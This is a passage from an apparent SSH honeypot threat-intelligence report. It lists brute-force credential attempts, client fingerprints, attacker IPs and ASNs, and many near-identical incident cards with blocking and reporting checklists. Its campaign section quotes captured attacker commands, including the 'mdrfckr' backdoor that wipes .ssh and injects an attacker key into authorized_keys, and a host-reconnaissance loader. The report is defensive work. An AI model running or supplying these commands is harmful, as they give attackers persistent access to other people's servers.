| `ADMINISTRATEUR123` | `` | `10.0.0.73` | 2026-09-12T14:42:58 |
| `root` | `admin@2017` | `10.0.0.73` | 2026-09-12T14:43:23 |
| `kafka` | `kafka1234` | `10.0.0.73` | 2026-09-12T14:43:43 |
| `aditya` | `aditya` | `195.178.110.218` | 2026-09-12T14:43:51 |
| `testuser` | `Abc@123` | `10.0.0.73` | 2026-09-12T14:44:15 |
| `root` | `server2023` | `10.0.0.73` | 2026-09-12T14:44:23 |
| `root` | `service` | `10.0.0.73` | 2026-09-12T14:45:03 |
| `alexander` | `alexander` | `195.178.110.218` | 2026-09-12T14:45:33 |
| `testuser` | `abc@123` | `10.0.0.73` | 2026-09-12T14:45:51 |
| `root` | `12345678` | `80.94.92.234` | 2026-09-12T14:46:25 |
| `root` | `scan` | `10.0.0.73` | 2026-09-12T14:46:38 |
| `root` | `server2024` | `10.0.0.73` | 2026-09-12T14:46:42 |
| `kafka` | `kafka@1234` | `10.0.0.73` | 2026-09-12T14:46:43 |
| `localuser1` | `localuser1` | `195.178.110.218` | 2026-09-12T14:47:11 |
| `testuser` | `Aa@123` | `10.0.0.73` | 2026-09-12T14:47:25 |
| `ADMINISTRATOR1` | `` | `10.0.0.73` | 2026-09-12T14:47:57 |
| `root` | `scanner` | `10.0.0.73` | 2026-09-12T14:48:18 |
| `root` | `server2025` | `10.0.0.73` | 2026-09-12T14:48:21 |
| `root` | `123456789` | `80.94.92.234` | 2026-09-12T14:48:42 |
| `martin` | `martin` | `195.178.110.218` | 2026-09-12T14:48:52 |
| `testuser` | `AA@123` | `10.0.0.73` | 2026-09-12T14:49:04 |
| `ADMINISTRATOR12` | `` | `10.0.0.73` | 2026-09-12T14:49:19 |
| `root` | `Microsoft2025` | `10.0.0.73` | 2026-09-12T14:49:26 |
| `kafka` | `kafka` | `10.0.0.73` | 2026-09-12T14:49:51 |
| `root` | `public` | `10.0.0.73` | 2026-09-12T14:49:59 |
| `root` | `server@123` | `10.0.0.73` | 2026-09-12T14:50:04 |
| `yban` | `yban` | `195.178.110.218` | 2026-09-12T14:50:34 |
| `ADMINISTRATOR123` | `` | `10.0.0.73` | 2026-09-12T14:50:41 |
| `testuser` | `AA123` | `10.0.0.73` | 2026-09-12T14:50:44 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-09-12T14:50:52 |
| `root` | `asdf1234` | `10.0.0.73` | 2026-09-12T14:51:41 |
| `root` | `server@1234` | `10.0.0.73` | 2026-09-12T14:51:51 |
| `ADMINISTRATOR1234` | `` | `10.0.0.73` | 2026-09-12T14:52:05 |
| `jimmy` | `jimmy` | `195.178.110.218` | 2026-09-12T14:52:13 |
| `testuser` | `aa@123` | `10.0.0.73` | 2026-09-12T14:52:24 |
| `root` | `Microsoft12345` | `10.0.0.73` | 2026-09-12T14:52:58 |
| `root` | `Password1` | `80.94.92.234` | 2026-09-12T14:52:58 |
| `redis` | `redis@123` | `10.0.0.73` | 2026-09-12T14:53:00 |
| `root` | `qq123456` | `10.0.0.73` | 2026-09-12T14:53:22 |
| `root` | `server@12345` | `10.0.0.73` | 2026-09-12T14:53:32 |
| `sdadmin` | `51nGleD` | `195.178.110.218` | 2026-09-12T14:53:51 |
| `testuser` | `Aa123` | `10.0.0.73` | 2026-09-12T14:54:04 |
| `ADMINISTRATOR55` | `` | `10.0.0.73` | 2026-09-12T14:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **130** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 86 |
| libssh | 7 |
| OpenSSH | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 76 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `390ffe68a68c...` | Modern SSH client | 4 | 3 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 76 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 4 | 3 | Modern SSH client |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 9 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `97.74.236.4`, `101.47.156.21`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **15** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 8 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS204929` | Television, Telephony, Internet of Ukraine Ltd. | 1 | MEDIUM |
| `AS269838` | MENA CORNEJO HECTOR ELIAS (TECMESH) | 1 | HIGH |
| `AS24940` | Hetzner Online GmbH | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | HIGH |
| `AS132167` | Nine Communications Company Limited | 1 | LOW |
| `AS6768` | EUROTELE-PLUS LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (96)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1cb165b5dc21

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 12:55 |
| **Last Seen** | 2026-09-12 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 12:55:21` | `cowrie.session.connect` |
| `2026-09-12 12:55:21` | `cowrie.client.version` |
| `2026-09-12 12:55:21` | `cowrie.client.kex` |
| `2026-09-12 12:55:21` | `cowrie.login.success` |
| `2026-09-12 12:55:22` | `cowrie.session.params` |
| `2026-09-12 12:55:22` | `cowrie.command.input` |
| `2026-09-12 12:55:22` | `cowrie.log.closed` |
| `2026-09-12 12:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eef98e99709

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 12:56 |
| **Last Seen** | 2026-09-12 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 12:56:56` | `cowrie.session.connect` |
| `2026-09-12 12:56:56` | `cowrie.client.version` |
| `2026-09-12 12:56:56` | `cowrie.client.kex` |
| `2026-09-12 12:56:56` | `cowrie.login.success` |
| `2026-09-12 12:56:57` | `cowrie.session.params` |
| `2026-09-12 12:56:57` | `cowrie.command.input` |
| `2026-09-12 12:56:57` | `cowrie.log.closed` |
| `2026-09-12 12:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16cb20596630

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 12:58 |
| **Last Seen** | 2026-09-12 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 12:58:29` | `cowrie.session.connect` |
| `2026-09-12 12:58:29` | `cowrie.client.version` |
| `2026-09-12 12:58:29` | `cowrie.client.kex` |
| `2026-09-12 12:58:29` | `cowrie.login.success` |
| `2026-09-12 12:58:30` | `cowrie.session.params` |
| `2026-09-12 12:58:30` | `cowrie.command.input` |
| `2026-09-12 12:58:30` | `cowrie.log.closed` |
| `2026-09-12 12:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7c27576773

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:00 |
| **Last Seen** | 2026-09-12 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:00:05` | `cowrie.session.connect` |
| `2026-09-12 13:00:05` | `cowrie.client.version` |
| `2026-09-12 13:00:05` | `cowrie.client.kex` |
| `2026-09-12 13:00:05` | `cowrie.login.success` |
| `2026-09-12 13:00:06` | `cowrie.session.params` |
| `2026-09-12 13:00:06` | `cowrie.command.input` |
| `2026-09-12 13:00:06` | `cowrie.log.closed` |
| `2026-09-12 13:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7b243c1281

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:01 |
| **Last Seen** | 2026-09-12 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:01:46` | `cowrie.session.connect` |
| `2026-09-12 13:01:46` | `cowrie.client.version` |
| `2026-09-12 13:01:46` | `cowrie.client.kex` |
| `2026-09-12 13:01:46` | `cowrie.login.success` |
| `2026-09-12 13:01:47` | `cowrie.session.params` |
| `2026-09-12 13:01:47` | `cowrie.command.input` |
| `2026-09-12 13:01:47` | `cowrie.log.closed` |
| `2026-09-12 13:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4989871051

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:03 |
| **Last Seen** | 2026-09-12 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:03:24` | `cowrie.session.connect` |
| `2026-09-12 13:03:24` | `cowrie.client.version` |
| `2026-09-12 13:03:24` | `cowrie.client.kex` |
| `2026-09-12 13:03:25` | `cowrie.login.success` |
| `2026-09-12 13:03:26` | `cowrie.session.params` |
| `2026-09-12 13:03:26` | `cowrie.command.input` |
| `2026-09-12 13:03:26` | `cowrie.log.closed` |
| `2026-09-12 13:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa79d8e63240

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:04 |
| **Last Seen** | 2026-09-12 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:04:58` | `cowrie.session.connect` |
| `2026-09-12 13:04:58` | `cowrie.client.version` |
| `2026-09-12 13:04:58` | `cowrie.client.kex` |
| `2026-09-12 13:04:58` | `cowrie.login.success` |
| `2026-09-12 13:04:59` | `cowrie.session.params` |
| `2026-09-12 13:04:59` | `cowrie.command.input` |
| `2026-09-12 13:04:59` | `cowrie.log.closed` |
| `2026-09-12 13:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17076a8e6320

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:06 |
| **Last Seen** | 2026-09-12 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:06:32` | `cowrie.session.connect` |
| `2026-09-12 13:06:32` | `cowrie.client.version` |
| `2026-09-12 13:06:32` | `cowrie.client.kex` |
| `2026-09-12 13:06:32` | `cowrie.login.success` |
| `2026-09-12 13:06:33` | `cowrie.session.params` |
| `2026-09-12 13:06:33` | `cowrie.command.input` |
| `2026-09-12 13:06:33` | `cowrie.log.closed` |
| `2026-09-12 13:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9fea3c198f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:08 |
| **Last Seen** | 2026-09-12 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:08:09` | `cowrie.session.connect` |
| `2026-09-12 13:08:09` | `cowrie.client.version` |
| `2026-09-12 13:08:09` | `cowrie.client.kex` |
| `2026-09-12 13:08:10` | `cowrie.login.success` |
| `2026-09-12 13:08:10` | `cowrie.session.params` |
| `2026-09-12 13:08:10` | `cowrie.command.input` |
| `2026-09-12 13:08:11` | `cowrie.log.closed` |
| `2026-09-12 13:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6765c27b47

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:09 |
| **Last Seen** | 2026-09-12 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:09:44` | `cowrie.session.connect` |
| `2026-09-12 13:09:44` | `cowrie.client.version` |
| `2026-09-12 13:09:44` | `cowrie.client.kex` |
| `2026-09-12 13:09:44` | `cowrie.login.success` |
| `2026-09-12 13:09:45` | `cowrie.session.params` |
| `2026-09-12 13:09:45` | `cowrie.command.input` |
| `2026-09-12 13:09:45` | `cowrie.log.closed` |
| `2026-09-12 13:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-055c0d2ea595

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:11 |
| **Last Seen** | 2026-09-12 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:11:17` | `cowrie.session.connect` |
| `2026-09-12 13:11:17` | `cowrie.client.version` |
| `2026-09-12 13:11:17` | `cowrie.client.kex` |
| `2026-09-12 13:11:18` | `cowrie.login.success` |
| `2026-09-12 13:11:18` | `cowrie.session.params` |
| `2026-09-12 13:11:18` | `cowrie.command.input` |
| `2026-09-12 13:11:19` | `cowrie.log.closed` |
| `2026-09-12 13:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433bf0518682

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:12 |
| **Last Seen** | 2026-09-12 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:12:54` | `cowrie.session.connect` |
| `2026-09-12 13:12:54` | `cowrie.client.version` |
| `2026-09-12 13:12:54` | `cowrie.client.kex` |
| `2026-09-12 13:12:55` | `cowrie.login.success` |
| `2026-09-12 13:12:55` | `cowrie.session.params` |
| `2026-09-12 13:12:55` | `cowrie.command.input` |
| `2026-09-12 13:12:56` | `cowrie.log.closed` |
| `2026-09-12 13:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48704a167144

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:14 |
| **Last Seen** | 2026-09-12 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:14:36` | `cowrie.session.connect` |
| `2026-09-12 13:14:36` | `cowrie.client.version` |
| `2026-09-12 13:14:36` | `cowrie.client.kex` |
| `2026-09-12 13:14:36` | `cowrie.login.success` |
| `2026-09-12 13:14:37` | `cowrie.session.params` |
| `2026-09-12 13:14:37` | `cowrie.command.input` |
| `2026-09-12 13:14:37` | `cowrie.log.closed` |
| `2026-09-12 13:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813ff69e3474

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:16 |
| **Last Seen** | 2026-09-12 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:16:14` | `cowrie.session.connect` |
| `2026-09-12 13:16:14` | `cowrie.client.version` |
| `2026-09-12 13:16:14` | `cowrie.client.kex` |
| `2026-09-12 13:16:14` | `cowrie.login.success` |
| `2026-09-12 13:16:15` | `cowrie.session.params` |
| `2026-09-12 13:16:15` | `cowrie.command.input` |
| `2026-09-12 13:16:15` | `cowrie.log.closed` |
| `2026-09-12 13:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ecb6511c057

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:17 |
| **Last Seen** | 2026-09-12 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:17:50` | `cowrie.session.connect` |
| `2026-09-12 13:17:50` | `cowrie.client.version` |
| `2026-09-12 13:17:50` | `cowrie.client.kex` |
| `2026-09-12 13:17:50` | `cowrie.login.success` |
| `2026-09-12 13:17:51` | `cowrie.session.params` |
| `2026-09-12 13:17:51` | `cowrie.command.input` |
| `2026-09-12 13:17:51` | `cowrie.log.closed` |
| `2026-09-12 13:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980b68aeebb7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:19 |
| **Last Seen** | 2026-09-12 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:19:26` | `cowrie.session.connect` |
| `2026-09-12 13:19:26` | `cowrie.client.version` |
| `2026-09-12 13:19:26` | `cowrie.client.kex` |
| `2026-09-12 13:19:27` | `cowrie.login.success` |
| `2026-09-12 13:19:28` | `cowrie.session.params` |
| `2026-09-12 13:19:28` | `cowrie.command.input` |
| `2026-09-12 13:19:28` | `cowrie.log.closed` |
| `2026-09-12 13:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471b9315932c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:21 |
| **Last Seen** | 2026-09-12 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:21:05` | `cowrie.session.connect` |
| `2026-09-12 13:21:05` | `cowrie.client.version` |
| `2026-09-12 13:21:06` | `cowrie.client.kex` |
| `2026-09-12 13:21:06` | `cowrie.login.success` |
| `2026-09-12 13:21:07` | `cowrie.session.params` |
| `2026-09-12 13:21:07` | `cowrie.command.input` |
| `2026-09-12 13:21:07` | `cowrie.log.closed` |
| `2026-09-12 13:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a99ddc9d946

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:22 |
| **Last Seen** | 2026-09-12 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:22:41` | `cowrie.session.connect` |
| `2026-09-12 13:22:41` | `cowrie.client.version` |
| `2026-09-12 13:22:41` | `cowrie.client.kex` |
